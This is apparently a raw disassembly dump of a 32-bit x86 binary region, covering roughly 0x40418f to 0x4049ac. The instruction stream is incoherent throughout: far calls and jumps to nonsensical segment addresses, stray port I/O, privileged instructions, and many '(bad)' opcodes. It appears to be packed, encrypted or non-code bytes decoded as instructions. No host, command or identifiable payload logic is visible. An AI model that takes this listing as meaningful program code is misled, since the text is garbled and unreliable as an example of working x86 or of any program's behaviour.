  40418f:	and    eax,0x21fc07e6
  404194:	pop    es
  404195:	push   ebx
  404196:	test   DWORD PTR [eax-0x7e],eax
  404199:	pusha  
  40419a:	jmp    0xb7974f01
  40419f:	cli    
  4041a0:	pop    ss
  4041a1:	jno    0x404191
  4041a3:	adc    eax,0x29283338
  4041a8:	ss mov esi,0x31731797
  4041ae:	mov    ebp,DWORD PTR [ebp-0x72]
  4041b1:	out    dx,eax
  4041b2:	call   0x79ad:0x52156bc4
  4041b9:	fcomp  DWORD PTR [ecx]
  4041bb:	aas    
  4041bc:	mov    ds:0x132be1d6,eax
  4041c1:	fcomp  DWORD PTR [eax+0x3b1b3b7c]
  4041c7:	push   0xca4b4ed1
  4041cc:	pushf  
  4041cd:	repnz sub cl,BYTE PTR [edi+0x215e8a53]
  4041d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d5:	hlt    
  4041d6:	call   0xe1e:0x9c34518e
  4041dd:	mov    edi,0x599b8281
  4041e2:	cdq    
  4041e3:	clc    
  4041e4:	or     BYTE PTR [edi],al
  4041e6:	cmp    ch,BYTE PTR [eax+0x481344a8]
  4041ec:	pop    esp
  4041ed:	out    dx,al
  4041ee:	push   ss
  4041ef:	ror    DWORD PTR [esp+ebp*4],0x3c
  4041f3:	push   0xdc1a12d2
  4041f8:	xor    BYTE PTR [ebp-0x11],dh
  4041fb:	adc    BYTE PTR [eax-0x1b],ch
  4041fe:	and    dh,BYTE PTR [edx-0x415870a0]
  404204:	cdq    
  404205:	and    ah,BYTE PTR [ebx+ebp*4]
  404208:	aam    0x6c
  40420a:	sbb    ah,cl
  40420c:	mov    al,ds:0x86274275
  404211:	lods   al,BYTE PTR ds:[esi]
  404212:	popf   
  404213:	call   FWORD PTR [ecx+0x6a]
  404216:	mov    cl,0x3
  404218:	fisttp DWORD PTR [eax-0x59]
  40421b:	fbstp  TBYTE PTR ds:0x3ede7778
  404221:	in     eax,0xb4
  404223:	mov    ebp,0x7b74f555
  404228:	pop    esp
  404229:	or     BYTE PTR [eax-0x64],ah
  40422c:	ins    BYTE PTR es:[edi],dx
  40422d:	aad    0xa9
  40422f:	out    dx,eax
  404230:	sahf   
  404231:	mov    cl,BYTE PTR [eax]
  404233:	pop    ebx
  404234:	sbb    eax,0x5cf6990a
  404239:	cdq    
  40423a:	add    al,0x15
  40423c:	xchg   ebx,eax
  40423d:	jne    0x40423b
  40423f:	mov    ebx,0xbd7f1e8b
  404244:	(bad)  
  404245:	loope  0x4042aa
  404247:	mov    edx,es
  404249:	mov    bl,0x2
  40424b:	push   0x626bbd2c
  404250:	xchg   esi,edx
  404252:	xor    dh,bl
  404254:	rol    BYTE PTR [eax],cl
  404256:	cmc    
  404257:	lods   al,BYTE PTR ds:[esi]
  404258:	cmp    al,0xa8
  40425a:	dec    esi
  40425b:	into   
  40425c:	push   eax
  40425e:	fidiv  WORD PTR [edx+ebp*8]
  404261:	call   0x6794:0x33575645
  404268:	dec    ecx
  404269:	add    esp,ecx
  40426b:	fucom  st(2)
  40426d:	gs pop esi
  40426f:	call   0x52f42213
  404274:	mov    edi,0x73f906b0
  404279:	xor    esi,ebp
  40427b:	xor    ecx,DWORD PTR [ebp+0x37c942d]
  404281:	mov    edi,0x75115a46
  404286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404287:	popa   
  404288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404289:	mov    bl,0xf4
  40428b:	jmp    0x9232:0xedf31b4b
  404292:	or     cl,BYTE PTR [esi-0x41]
  404295:	xor    bh,BYTE PTR [esi]
  404297:	push   cs
  404298:	xor    al,0xad
  40429a:	test   eax,edx
  40429c:	jb     0x404274
  40429e:	pop    eax
  40429f:	ins    BYTE PTR es:[edi],dx
  4042a0:	popa   
  4042a1:	jb     0x404316
  4042a3:	mov    ebx,0x62215a7d
  4042a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a9:	jns    0x4042e2
  4042ab:	xchg   ebx,eax
  4042ac:	and    al,BYTE PTR [edi]
  4042ae:	xchg   ecx,eax
  4042af:	dec    BYTE PTR [ebp-0x7c]
  4042b2:	pop    es
  4042b3:	mov    ds:0x3f0d8f8d,eax
  4042b8:	adc    DWORD PTR [ebx],0xf
  4042bb:	retf   0xd41b
  4042be:	cmp    eax,0x5134be56
  4042c3:	sub    esp,ecx
  4042c5:	loop   0x40431c
  4042c7:	rol    DWORD PTR [ebx+0x6abdbddc],1
  4042cd:	sub    eax,0xb2226ef3
  4042d2:	push   esi
  4042d3:	or     DWORD PTR [ebx+eiz*1+0x65],edi
  4042d7:	and    DWORD PTR [eax+0x1a],0x5f
  4042db:	je     0x4042ed
  4042dd:	mov    esi,DWORD PTR [ebx-0x3a]
  4042e0:	mov    esi,0xd31cdfc7
  4042e5:	cmp    BYTE PTR [edi],bh
  4042e7:	aaa    
  4042e8:	sbb    al,0x63
  4042ea:	mov    ah,0x8f
  4042ec:	adc    bl,BYTE PTR [ebp-0x61]
  4042ef:	pushf  
  4042f0:	add    eax,0xec44e8c0
  4042f5:	(bad)  
  4042f6:	aad    0x4a
  4042f8:	push   ds
  4042f9:	outs   dx,DWORD PTR ds:[esi]
  4042fa:	push   ebp
  4042fb:	cwde   
  4042fc:	or     al,0xda
  4042fe:	sar    ebp,0xe6
  404301:	pop    ebx
  404302:	xlat   BYTE PTR ds:[ebx]
  404303:	sbb    al,0x99
  404305:	test   DWORD PTR [esi+0x633256e1],0x353ef79c
  40430f:	push   es
  404310:	cpuid  
  404312:	cmc    
  404313:	repz in eax,dx
  404315:	and    edx,DWORD PTR [eax+0x63]
  404318:	push   0x4e
  40431a:	fwait
  40431b:	mov    eax,ds:0xf10bd8b4
  404320:	dec    ecx
  404321:	mov    dl,BYTE PTR [ecx-0x13ec615e]
  404327:	mov    bh,0x68
  404329:	xchg   ebp,eax
  40432a:	mov    ah,0x6a
  40432c:	sti    
  40432d:	loop   0x4042d6
  40432f:	sahf   
  404330:	jb     0x40434a
  404332:	push   edi
  404333:	leave  
  404334:	push   ebx
  404335:	sbb    ecx,DWORD PTR [esi]
  404337:	xchg   DWORD PTR [eax+esi*1-0x553349c2],edi
  40433e:	adc    eax,0x36e02e0a
  404343:	outs   dx,BYTE PTR ds:[esi]
  404344:	inc    ecx
  404345:	pop    ds
  404346:	shl    DWORD PTR [ebx+0x50bfe053],0x53
  40434d:	imul   esp,DWORD PTR [eax],0x68919c06
  404353:	popf   
  404354:	sti    
  404355:	and    eax,0x20cf6bb0
  40435a:	xchg   ecx,eax
  40435b:	addr16 mov eax,0xe8d997be
  404361:	stos   DWORD PTR es:[edi],eax
  404362:	add    eax,0xefd39a03
  404367:	lods   al,BYTE PTR ds:[esi]
  404368:	mov    ch,0x20
  40436a:	cmp    eax,0x54ee16bf
  404370:	in     al,0xb8
  404372:	daa    
  404373:	ret    
  404374:	arpl   WORD PTR [eax-0x63e592d7],si
  40437a:	bound  ebp,QWORD PTR [eax+0x62fac1ae]
  404380:	fwait
  404381:	mov    bl,BYTE PTR [eax]
  404383:	sti    
  404384:	outs   dx,DWORD PTR ds:[esi]
  404385:	das    
  404386:	retf   
  404387:	mov    cl,BYTE PTR [edx+0x19]
  40438a:	add    al,0x2b
  40438c:	mov    ch,0x32
  40438e:	cs push edx
  404390:	push   edx
  404391:	stos   BYTE PTR es:[edi],al
  404392:	push   DWORD PTR [eax-0x50a2b8c5]
  404398:	cli    
  404399:	sub    al,0x6f
  40439b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40439c:	cmp    cl,bl
  40439e:	ins    DWORD PTR es:[edi],dx
  40439f:	rcr    BYTE PTR [edi-0x66800110],0x73
  4043a6:	dec    esi
  4043a7:	add    eax,0x3f76e3e1
  4043ac:	mov    BYTE PTR [esi],dh
  4043ae:	push   ecx
  4043af:	xor    DWORD PTR [eax+0xc],edx
  4043b2:	adc    edx,edi
  4043b4:	xchg   bh,ch
  4043b6:	pop    edx
  4043b7:	or     eax,DWORD PTR ds:0x3f951c09
  4043be:	cmp    BYTE PTR [edx],bl
  4043c0:	jecxz  0x4043d8
  4043c2:	pusha  
  4043c3:	dec    ebx
  4043c4:	xor    ch,BYTE PTR [edx+0x9]
  4043c7:	cmp    esp,ebp
  4043c9:	loopne 0x404376
  4043cb:	xor    eax,0x34460d4a
  4043d0:	in     eax,0x27
  4043d2:	mov    eax,ds:0xb968c533
  4043d7:	xor    cl,al
  4043d9:	pop    es
  4043da:	sub    eax,0x3bd8935d
  4043df:	in     al,0x59
  4043e1:	sahf   
  4043e2:	jle    0x4043d3
  4043e4:	pop    ebp
  4043e5:	pop    eax
  4043e6:	pusha  
  4043e7:	cmp    al,0xf1
  4043e9:	cli    
  4043ea:	mov    edx,ebp
  4043ec:	mov    ch,0xaa
  4043ee:	inc    edi
  4043ef:	adc    ebx,DWORD PTR [eax-0x1feadd4a]
  4043f5:	push   es
  4043f6:	jbe    0x404385
  4043f8:	mov    dh,bh
  4043fa:	je     0x404425
  4043fc:	mov    cl,0xe3
  4043fe:	sub    eax,0x41f747ab
  404403:	fdivr  QWORD PTR [ecx+0x625dd0a1]
  404409:	mov    ah,0xe0
  40440b:	fs aaa 
  40440d:	push   ebp
  40440e:	test   BYTE PTR [edx-0x22326672],dl
  404414:	dec    ebp
  404415:	and    BYTE PTR [edi+0x26],0x6e
  404419:	adc    al,0x18
  40441b:	inc    edx
  40441c:	inc    esi
  40441d:	call   0xcba1c4bc
  404422:	fs push ds
  404424:	(bad)  
  404425:	out    dx,eax
  404426:	mov    ecx,0xdbdbf354
  40442b:	imul   esp,DWORD PTR [ebp+eiz*2-0x1b],0xffffff86
  404430:	mov    al,0xbf
  404432:	(bad)  
  404433:	(bad)  
  404434:	test   DWORD PTR [ecx+ebx*4+0x95cf6a8],0xdc3952d1
  40443f:	jo     0x4043ee
  404441:	xchg   edi,eax
  404442:	scas   al,BYTE PTR es:[edi]
  404443:	dec    esi
  404444:	cmp    eax,0x6991e683
  404449:	aas    
  40444a:	pop    esi
  40444b:	jp     0x4044c9
  40444d:	pusha  
  40444e:	or     al,0xb5
  404450:	adc    edi,DWORD PTR [ebp-0x60907848]
  404456:	rep outs dx,BYTE PTR ds:[esi]
  404458:	mov    bh,0xdc
  40445a:	jmp    0xbf1c:0xac1347be
  404461:	mov    bh,0x19
  404463:	sub    DWORD PTR [ebx-0x65],edx
  404466:	out    dx,eax
  404467:	jns    0x4044e1
  404469:	dec    ecx
  40446a:	clc    
  40446b:	int    0x1b
  40446d:	loop   0x40447a
  40446f:	fnstcw WORD PTR [edx-0x64c3706a]
  404475:	pop    ebp
  404476:	inc    ebp
  404477:	jnp    0x40445b
  404479:	mov    eax,ds:0x50b83772
  40447e:	mov    edi,0x78b931e2
  404483:	cmp    eax,0x6397460d
  404488:	lahf   
  404489:	sub    al,0x18
  40448b:	loope  0x404444
  40448d:	sub    eax,0x8a5c10dd
  404492:	ins    DWORD PTR es:[edi],dx
  404493:	sub    DWORD PTR [ebx+0x10],0xfffffffa
  404497:	and    al,0x25
  404499:	loope  0x40444e
  40449b:	jl     0x4044e1
  40449d:	jecxz  0x404443
  40449f:	mov    esp,0xf0b03f00
  4044a4:	mov    al,0x9a
  4044a6:	and    eax,0xf8597645
  4044ab:	dec    esi
  4044ac:	mov    eax,ds:0xa306dd06
  4044b1:	stos   DWORD PTR es:[edi],eax
  4044b2:	imul   edi,DWORD PTR [eax-0x522ee766],0x49a5c5d6
  4044bc:	ins    BYTE PTR es:[edi],dx
  4044bd:	xor    al,0x1e
  4044bf:	std    
  4044c0:	outs   dx,DWORD PTR ds:[esi]
  4044c1:	ds shl al,1
  4044c4:	jmp    0x7486e3ea
  4044c9:	push   cs
  4044ca:	inc    eax
  4044cb:	out    0xe8,eax
  4044cd:	mov    al,ds:0x77eae2a4
  4044d2:	pop    ss
  4044d3:	pushf  
  4044d4:	adc    edi,DWORD PTR [esi-0x3b5ac0f9]
  4044da:	add    eax,0x3d087cfc
  4044df:	pusha  
  4044e0:	and    eax,0x9114bb34
  4044e5:	test   DWORD PTR [esi+0x13],0xe696fb77
  4044ec:	cmp    al,0x8
  4044ee:	out    dx,al
  4044ef:	sbb    BYTE PTR [esi+ebx*1],bh
  4044f2:	(bad)  
  4044f4:	lds    ecx,FWORD PTR [ebp-0x67]
  4044f7:	push   esp
  4044f8:	and    BYTE PTR ds:[edx],ch
  4044fb:	addr16 sbb eax,0xca429a6a
  404501:	leave  
  404502:	fcmovb st,st(3)
  404504:	jo     0x4044e4
  404506:	jo     0x404557
  404508:	ins    BYTE PTR es:[edi],dx
  404509:	fmul   QWORD PTR ds:0x49cacf4e
  40450f:	add    edx,DWORD PTR [ebx-0x72]
  404512:	dec    esp
  404513:	cs dec ebx
  404515:	pusha  
  404516:	and    eax,0x5dd72f96
  40451b:	enter  0x2b3c,0x98
  40451f:	pop    ebp
  404520:	pminsw mm4,QWORD PTR [ecx+0xbda3174]
  404527:	shl    DWORD PTR [eax],cl
  404529:	jp     0x404514
  40452b:	pop    esi
  40452c:	enter  0x6503,0x1e
  404530:	mov    ch,ch
  404532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404533:	inc    ecx
  404534:	mov    esi,0x16b2c77
  404539:	add    edi,0xffffffd2
  40453c:	fwait
  40453d:	cs iret 
  40453f:	int    0xe9
  404541:	mov    eax,0x67762fca
  404546:	cmp    eax,0x1f7d1e43
  40454b:	ss repnz cmp eax,0x839f6df0
  404552:	cli    
  404553:	and    al,0x18
  404555:	or     ecx,DWORD PTR [edx-0x757b5de3]
  40455b:	(bad)  
  40455c:	adc    edi,DWORD PTR [eax]
  40455e:	cmp    DWORD PTR [edx-0x1026afa],edx
  404564:	jno    0x4045c6
  404566:	or     al,0xc0
  404568:	scas   eax,DWORD PTR es:[edi]
  404569:	xor    BYTE PTR [eax],cl
  40456b:	mov    ss,WORD PTR [eax+0x1c]
  40456e:	or     DWORD PTR [ecx-0x53],0x11
  404572:	add    eax,0x5c9396aa
  404577:	(bad)  
  404579:	out    dx,al
  40457a:	mov    edx,0x98b331ea
  40457f:	(bad)  
  404580:	cmc    
  404581:	lods   eax,DWORD PTR ds:[esi]
  404582:	mov    dl,0x5a
  404584:	dec    edx
  404585:	addr16 dec ebp
  404587:	cmp    BYTE PTR [edx],bh
  404589:	ret    
  40458a:	dec    edi
  40458b:	jmp    0xac854af
  404590:	and    DWORD PTR [edx-0x44],ecx
  404593:	sbb    BYTE PTR [esi+0x45d5062f],ch
  404599:	sbb    DWORD PTR [eax-0x5f],edi
  40459c:	cmp    dh,BYTE PTR [ecx*1-0x3981d4f3]
  4045a3:	test   DWORD PTR [ecx+0x73],edx
  4045a6:	sti    
  4045a7:	cli    
  4045a8:	mov    eax,ds:0xc49f6859
  4045ad:	jmp    0x4045b4
  4045af:	cmp    ch,BYTE PTR [eax]
  4045b1:	dec    ecx
  4045b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b3:	cli    
  4045b4:	loop   0x4045ec
  4045b6:	nop
  4045b7:	dec    ebx
  4045b8:	or     BYTE PTR [edx+esi*1+0x0],ah
  4045bc:	(bad)  
  4045bd:	imul   esi,ebx,0xffffffe4
  4045c0:	rol    BYTE PTR [edi],0x41
  4045c3:	ret    
  4045c4:	jno    0x40460e
  4045c6:	adc    eax,0x91be4501
  4045cb:	pop    edi
  4045cc:	jnp    0x4045ed
  4045ce:	popf   
  4045cf:	inc    edx
  4045d0:	int    0x22
  4045d2:	ja     0x404595
  4045d4:	mov    esi,DWORD PTR [eax]
  4045d6:	fistp  WORD PTR [esi+0x3]
  4045d9:	in     eax,dx
  4045da:	inc    eax
  4045db:	dec    ebx
  4045dc:	pop    ebx
  4045dd:	push   edx
  4045de:	pop    ss
  4045df:	pushf  
  4045e0:	pop    esi
  4045e1:	add    ch,dh
  4045e3:	rcr    DWORD PTR [edi+0x6f],cl
  4045e6:	pop    edx
  4045e7:	clc    
  4045e8:	mov    al,ds:0x274a1079
  4045ed:	or     al,0x0
  4045ef:	dec    BYTE PTR [esi]
  4045f1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4045f3:	dec    esi
  4045f4:	int    0x33
  4045f6:	mov    bl,0xfa
  4045f8:	dec    ecx
  4045f9:	out    0xb6,eax
  4045fb:	adc    ebp,DWORD PTR [ebp+0x1a]
  4045fe:	clc    
  4045ff:	pushw  es
  404601:	mov    bh,0x6e
  404603:	cdq    
  404604:	stos   BYTE PTR es:[edi],al
  404605:	das    
  404606:	push   ebx
  404607:	sbb    BYTE PTR [ebp+0x53],cl
  40460a:	pop    edx
  40460b:	loope  0x404663
  40460d:	xor    al,0xd5
  40460f:	add    DWORD PTR [ebx+0x314dd9ba],esi
  404615:	jae    0x404674
  404617:	adc    al,0xbf
  404619:	int3   
  40461a:	out    dx,al
  40461b:	push   ecx
  40461c:	test   BYTE PTR [edx-0x34d53e5],bh
  404622:	ficom  DWORD PTR [edi+0x65]
  404625:	hlt    
  404626:	push   es
  404627:	xor    dl,ah
  404629:	addr16 int 0xc7
  40462c:	pop    ebx
  40462d:	xor    eax,0x303a7625
  404632:	jge    0x40464b
  404634:	pushf  
  404635:	xor    BYTE PTR [edx],bl
  404637:	popa   
  404638:	pusha  
  404639:	lea    eax,[edx+0x4a4db208]
  40463f:	and    al,ah
  404641:	and    ch,cl
  404643:	aas    
  404644:	adc    edi,DWORD PTR [eax-0x56]
  404647:	adc    bh,BYTE PTR [eax]
  404649:	xor    ebx,DWORD PTR [ebx]
  40464b:	inc    ebx
  40464c:	das    
  40464d:	loop   0x404685
  40464f:	lods   ax,WORD PTR ds:[esi]
  404651:	lods   al,BYTE PTR ds:[esi]
  404652:	js     0x4045ea
  404654:	fwait
  404655:	mov    DWORD PTR [ecx],0xd427f736
  40465b:	sub    esp,DWORD PTR [ecx-0x71cf70c8]
  404661:	xor    DWORD PTR [eax-0x261cf76e],esi
  404667:	mov    ebp,0x312818bf
  40466c:	and    al,0x39
  40466e:	hlt    
  40466f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404670:	jmp    FWORD PTR [ebx-0x463ebcb2]
  404676:	fistp  DWORD PTR [esi+0x1f]
  404679:	lock shl ecx,0x48
  40467d:	fld    TBYTE PTR [edx]
  40467f:	mov    esi,0xb3d8a966
  404684:	adc    DWORD PTR [esp+eiz*8],0x52
  404688:	mov    edx,DWORD PTR [eax+0x53]
  40468b:	xchg   BYTE PTR [eax+0x60cc6c37],cl
  404691:	bound  ecx,QWORD PTR [ebx]
  404693:	imul   edx,DWORD PTR cs:[ecx-0x2ca48f32],0xed29d95d
  40469e:	add    ah,BYTE PTR [ebp+0x73d8743d]
  4046a4:	sub    dh,ch
  4046a6:	call   0x81e4c5e0
  4046ab:	pop    eax
  4046ac:	mov    al,ch
  4046ae:	fbstp  TBYTE PTR [edi+0x7a]
  4046b1:	dec    ebx
  4046b2:	test   eax,0x405af482
  4046b7:	sbb    al,0xf8
  4046b9:	shr    BYTE PTR [esi-0x47],cl
  4046bc:	xchg   esi,eax
  4046bd:	lds    edx,FWORD PTR ss:[esi+0x4b081904]
  4046c4:	inc    esp
  4046c5:	cmp    DWORD PTR [eax],esi
  4046c7:	push   ebp
  4046c8:	mov    ebx,0x11c7e4c1
  4046cd:	push   ecx
  4046ce:	outs   dx,DWORD PTR ds:[esi]
  4046cf:	cmp    DWORD PTR [esi+eax*8+0x5d3dec2a],edx
  4046d6:	mov    eax,ds:0x83f4afc8
  4046db:	inc    esi
  4046dc:	and    al,0xba
  4046de:	lock sub al,0xf5
  4046e1:	fmul   st,st(0)
  4046e3:	xchg   esi,eax
  4046e4:	mov    ds:0xb1944e51,eax
  4046e9:	mov    ecx,0xc608b550
  4046ee:	inc    esi
  4046ef:	jbe    0x4046a3
  4046f1:	mov    al,0x9d
  4046f3:	mov    ds:0x4ff9bcb,eax
  4046f8:	mov    eax,ds:0x9ca48024
  4046fd:	jo     0x404775
  4046ff:	scas   eax,DWORD PTR es:[edi]
  404700:	hlt    
  404701:	test   eax,0xe39913c0
  404706:	in     al,0x37
  404708:	mov    ebp,0x2e73dad6
  40470d:	fld    QWORD PTR [ebp+0x4d]
  404710:	lds    eax,FWORD PTR es:[ecx+0x46]
  404714:	mov    BYTE PTR [esp-0xd],bh
  404718:	push   0x5
  40471a:	test   eax,0xf782d784
  40471f:	or     eax,0x26644e4c
  404724:	sbb    DWORD PTR [esi],0xb1741f50
  40472a:	pop    ebp
  40472b:	or     eax,0xe49406b8
  404730:	pop    edx
  404731:	cmp    bh,dh
  404733:	push   ecx
  404734:	enter  0xf3e0,0x6d
  404738:	imul   ebp,DWORD PTR [ecx+0x4051f524],0xffffff80
  40473f:	xor    al,0xce
  404741:	call   0xe184:0x8d944824
  404748:	pop    ss
  404749:	and    eax,0xcb600fef
  40474e:	mov    edx,cs
  404750:	out    dx,eax
  404751:	aas    
  404752:	pop    ds
  404753:	fwait
  404754:	aad    0x96
  404756:	cwde   
  404757:	int3   
  404758:	or     al,0x9d
  40475a:	std    
  40475b:	mov    edx,0x7f372612
  404760:	ret    
  404761:	test   al,0x5a
  404763:	xchg   ebx,eax
  404764:	push   0xe
  404766:	test   al,0x45
  404768:	push   ss
  404769:	test   bl,al
  40476b:	push   esp
  40476c:	(bad)  
  40476e:	jnp    0x404708
  404770:	fs stos DWORD PTR es:[edi],eax
  404772:	sub    BYTE PTR [edi+0x2cb15735],0x85
  404779:	lods   eax,DWORD PTR ds:[esi]
  40477a:	(bad)  
  40477b:	fcom   DWORD PTR [ebx-0x6ce71f39]
  404781:	mov    dl,0x89
  404783:	push   es
  404784:	and    eax,DWORD PTR [esi-0x5dc35f61]
  40478a:	sbb    BYTE PTR [ebx-0x59],bh
  40478d:	ffree  st(2)
  40478f:	sbb    eax,0x4b88b4ea
  404794:	imul   ecx,DWORD PTR [eax-0x60],0x3b246a14
  40479b:	dec    edi
  40479c:	sbb    DWORD PTR [esi-0x6794435d],ecx
  4047a2:	or     bl,BYTE PTR fs:[ecx+0x6174ccff]
  4047a9:	out    dx,eax
  4047aa:	fcmovnu st,st(3)
  4047ac:	gs loopne 0x40477a
  4047af:	in     al,0xa8
  4047b1:	xchg   ebp,eax
  4047b2:	(bad)  
  4047b3:	jns    0x4047d5
  4047b5:	fidivr WORD PTR [ebx+0xaba8d8a]
  4047bb:	ins    DWORD PTR es:[edi],dx
  4047bc:	(bad)  
  4047bd:	mov    edi,0xf76b5a41
  4047c2:	push   0x8dc0f4d9
  4047c7:	adc    cl,dh
  4047c9:	scas   eax,DWORD PTR es:[edi]
  4047ca:	adc    eax,0xa5a8aec3
  4047cf:	mov    edi,0x56904b62
  4047d4:	(bad)  
  4047d5:	lods   eax,DWORD PTR ds:[esi]
  4047d6:	lods   eax,DWORD PTR es:[esi]
  4047d8:	sbb    bl,ah
  4047da:	or     esp,edx
  4047dc:	iret   
  4047dd:	xor    esp,0x3f
  4047e0:	retfw  0x1e2e
  4047e4:	idiv   bl
  4047e6:	repz inc edi
  4047e8:	mov    al,0xd8
  4047ea:	outs   dx,DWORD PTR ds:[esi]
  4047eb:	jge    0x40479f
  4047ed:	pusha  
  4047ee:	push   edx
  4047ef:	test   eax,0x4aeaa9ad
  4047f4:	or     BYTE PTR [edi],cl
  4047f6:	xlat   BYTE PTR ds:[ebx]
  4047f7:	cmp    DWORD PTR [ebx],0x548c1b00
  4047fd:	and    eax,0xfa2b9801
  404802:	pop    esp
  404803:	push   cs
  404804:	push   eax
  404805:	out    0x11,al
  404807:	int3   
  404808:	pop    esp
  404809:	sub    BYTE PTR [esp+edx*2-0x6f],0x3e
  40480e:	push   edi
  40480f:	leave  
  404810:	rcr    BYTE PTR [ecx-0x60af97c9],1
  404816:	pop    ecx
  404817:	sub    BYTE PTR [ecx-0x43754353],ah
  40481d:	stos   DWORD PTR es:[edi],eax
  40481e:	jno    0x4047dd
  404820:	xchg   ebp,eax
  404821:	cli    
  404822:	fstp   DWORD PTR [esi-0x158e0e45]
  404828:	mov    esi,0x3fb79ad7
  40482d:	fidiv  WORD PTR [esi]
  40482f:	dec    ecx
  404830:	inc    esp
  404831:	cdq    
  404832:	pop    esp
  404833:	jecxz  0x404887
  404835:	call   0x8fe0:0x26782664
  40483c:	(bad)  
  40483d:	mov    ch,0xb9
  40483f:	imul   edi,DWORD PTR [ebp+eax*8+0x48ceaba9],0x5b06ddae
  40484a:	mov    bl,0x25
  40484c:	mov    cl,0xc
  40484e:	je     0x40486f
  404850:	std    
  404851:	div    DWORD PTR [ecx+0x741f094e]
  404857:	pop    ecx
  404858:	lods   al,BYTE PTR ds:[esi]
  404859:	jl     0x4048da
  40485b:	aas    
  40485c:	fucomp st(3)
  40485e:	xchg   ecx,eax
  40485f:	sbb    edx,DWORD PTR [ecx+0xcb3ba62]
  404865:	sbb    BYTE PTR ds:0xc02575a8,ch
  40486b:	xchg   edi,eax
  40486c:	and    eax,0x9a3ba2fe
  404871:	pop    eax
  404872:	fidivr WORD PTR [edi]
  404874:	push   es
  404875:	out    0xc1,eax
  404877:	popa   
  404878:	jbe    0x4048a1
  40487a:	outs   dx,DWORD PTR ds:[esi]
  40487b:	fsub   DWORD PTR [ecx-0x62]
  40487e:	push   edi
  40487f:	rol    ah,0x88
  404882:	push   cs
  404883:	popa   
  404884:	pop    edi
  404885:	test   DWORD PTR [edi+0x435ca9ab],esi
  40488b:	xor    ebx,eax
  40488d:	leave  
  40488e:	adc    al,0x74
  404890:	cld    
  404891:	scas   eax,DWORD PTR es:[edi]
  404892:	in     al,0x51
  404894:	or     BYTE PTR ds:0xeded1813,ch
  40489a:	cmp    al,0x1d
  40489c:	mov    al,ds:0xc812ab03
  4048a1:	mov    cl,0x16
  4048a3:	daa    
  4048a4:	cwde   
  4048a5:	data16 jae 0x4048d0
  4048a8:	mov    ebx,0x90a77c2f
  4048ad:	sub    ah,dl
  4048af:	cmp    eax,0xbf4e438c
  4048b4:	push   edi
  4048b5:	ins    BYTE PTR es:[edi],dx
  4048b6:	mov    esp,0x920e0b7d
  4048bb:	sbb    ah,BYTE PTR [edx-0x43]
  4048be:	mov    al,ds:0x2e7da0ba
  4048c3:	sub    ebx,DWORD PTR [esi+0x58327ee4]
  4048c9:	add    eax,0xab566abb
  4048ce:	add    BYTE PTR ss:[edx-0x6c],cl
  4048d2:	mov    bh,0xce
  4048d4:	mov    esp,0xb1e99dd8
  4048d9:	dec    ecx
  4048da:	stos   BYTE PTR es:[edi],al
  4048db:	sbb    BYTE PTR [esi],0x43
  4048de:	cmp    DWORD PTR [ebp+0x68b1041d],ecx
  4048e4:	lahf   
  4048e5:	sub    BYTE PTR [edi],al
  4048e7:	hlt    
  4048e8:	pop    ss
  4048e9:	imul   edx,DWORD PTR [edi-0x67],0xf8cbe48d
  4048f0:	aaa    
  4048f1:	mov    cs,WORD PTR [eax-0x1c]
  4048f4:	push   cs
  4048f5:	add    eax,0xca461814
  4048fa:	out    0x94,eax
  4048fc:	or     BYTE PTR [ebx+0x24],dh
  4048ff:	jo     0x40488e
  404901:	add    al,0x68
  404903:	push   es
  404904:	shr    DWORD PTR [edx+0x6d],0x14
  404908:	dec    ecx
  404909:	stos   DWORD PTR es:[edi],eax
  40490a:	add    BYTE PTR [edx-0x16ca151a],al
  404910:	and    esp,edx
  404912:	xor    dh,al
  404914:	add    ah,BYTE PTR [edx+0x4cb435f5]
  40491a:	stos   DWORD PTR es:[edi],eax
  40491b:	pop    es
  40491c:	add    eax,0x1142bd4e
  404921:	ror    BYTE PTR [esi-0x9],cl
  404924:	pop    edx
  404925:	fwait
  404926:	daa    
  404927:	push   0xffffff89
  404929:	test   DWORD PTR ds:0x324d06ba,eax
  40492f:	ins    DWORD PTR es:[edi],dx
  404930:	pop    ecx
  404931:	inc    edx
  404932:	or     eax,0xd8a87b11
  404937:	cmp    DWORD PTR [ebx-0x7],eax
  40493a:	pop    ds
  40493b:	ja     0x404986
  40493d:	out    0xc0,eax
  40493f:	inc    esi
  404940:	sbb    esp,eax
  404942:	in     eax,dx
  404943:	jno    0x4049b9
  404945:	shl    cl,0x5b
  404948:	stos   DWORD PTR es:[edi],eax
  404949:	adc    DWORD PTR [edx],esp
  40494b:	pop    ecx
  40494c:	retf   0x391
  40494f:	cli    
  404950:	dec    edx
  404951:	sbb    eax,0x384d0d7b
  404956:	push   edx
  404957:	aam    0x8a
  404959:	nop
  40495a:	out    0xac,al
  40495c:	stos   BYTE PTR es:[edi],al
  40495d:	sub    DWORD PTR [ebx],ebx
  40495f:	xlat   BYTE PTR ds:[ebx]
  404960:	in     al,0xde
  404962:	ror    DWORD PTR [eax+0x770410bc],cl
  404968:	and    al,0xa1
  40496a:	cmp    ecx,DWORD PTR [ebx-0x479ad47c]
  404970:	ja     0x4049cf
  404972:	add    DWORD PTR [ebx],eax
  404974:	pop    eax
  404975:	pop    ss
  404976:	fsub   DWORD PTR [eax]
  404978:	adc    al,0x2d
  40497a:	cmp    al,0x62
  40497c:	xor    edx,DWORD PTR [ebx+0x2881dd70]
  404982:	pop    edi
  404983:	pop    ss
  404984:	mov    ah,0xfa
  404986:	inc    ecx
  404987:	mov    ebx,0x8d358c54
  40498c:	jo     0x404938
  40498e:	das    
  40498f:	or     al,0xbe
  404991:	ins    BYTE PTR es:[edi],dx
  404992:	ficomp DWORD PTR [ebx]
  404994:	add    al,0xae
  404996:	or     DWORD PTR [ecx+0x9],0x0
  40499a:	fisub  WORD PTR ds:0x60fdafd4
  4049a0:	mov    BYTE PTR [edi-0xa],bl
  4049a3:	push   0x15
  4049a5:	int3   
  4049a6:	jge    0x404992
  4049a8:	repnz mov db3,ebp
  4049ac:	lods   eax,DWORD PTR ds:[esi]
